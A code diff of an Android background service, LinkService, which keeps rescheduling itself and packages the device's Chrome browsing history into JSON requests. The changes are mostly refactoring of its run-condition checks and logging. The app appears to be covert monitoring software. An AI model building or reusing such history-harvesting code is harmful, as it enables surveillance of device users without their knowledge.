@@ -26,7 +26,7 @@ import android.util.Base64;
 import com.inet.android.request.ConstantRequest;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.WorkTimeDefiner;
+import com.inet.android.utils.WhileTheMethod;
 
 /**
  * Browser history viewing class
@@ -39,31 +39,16 @@ public class LinkService extends Service {
 	private static final int SERVICE_REQUEST_CODE = 25; // service unique int
 	private final String LOG_TAG = LinkService.class.getSimpleName().toString();
 	private final String SAVED_TIME = "saved_time";
-	private Context context;
 	private SharedPreferences sp;
 
 	public void onCreate() {
 		super.onCreate();
-		// startService(new Intent(this, LinkService.class));
-
-		Logging.doLog(LOG_TAG, "onCreate", "onCreate");
-
-		context = getApplicationContext();
-		sp = PreferenceManager.getDefaultSharedPreferences(context);
-
 	}
 
 	public int onStartCommand(Intent intent, int flags, int startId) {
 
 		sp = PreferenceManager.getDefaultSharedPreferences(this);
-		String linkEnd = sp.getString("www", "0");
-
-		if (linkEnd.equals("0")) {
-			Logging.doLog(LOG_TAG, "www : 0", "www : 0");
-
-			return 0;
-		}
-
+		
 		Calendar cal = Calendar.getInstance();
 		// restart task after 1 minute
 		cal.add(Calendar.MINUTE, Integer.parseInt(sp.getString("period", "1")));
@@ -76,18 +61,8 @@ public class LinkService extends Service {
 		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
 				servicePendingIntent);
 
-		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
-		if (!isWork) {
-			Logging.doLog(LOG_TAG,
-					"isDoWork return " + Boolean.toString(isWork),
-					"isDoWork return " + Boolean.toString(isWork));
-
-			return Service.START_STICKY;
-		} else {
-			Logging.doLog(LOG_TAG,
-					"isDoWork return " + Boolean.toString(isWork),
-					"isDoWork return " + Boolean.toString(isWork));
-		}
+		if (WhileTheMethod.getState(4, this) == 0)
+			return 0;
 
 		try {
 			linkTask();
@@ -286,7 +261,9 @@ public class LinkService extends Service {
 							info.put("name", chromeTitle);
 
 							object.put("time", urlDateInFormat);
-							object.put("type", ConstantRequest.TYPE_HISTORY_BROUSER_REQUEST);
+							object.put(
+									"type",
+									ConstantRequest.TYPE_HISTORY_BROUSER_REQUEST);
 							object.put("info", info);
 						} catch (JSONException e) {
 							Logging.doLog(LOG_TAG, "json сломался",
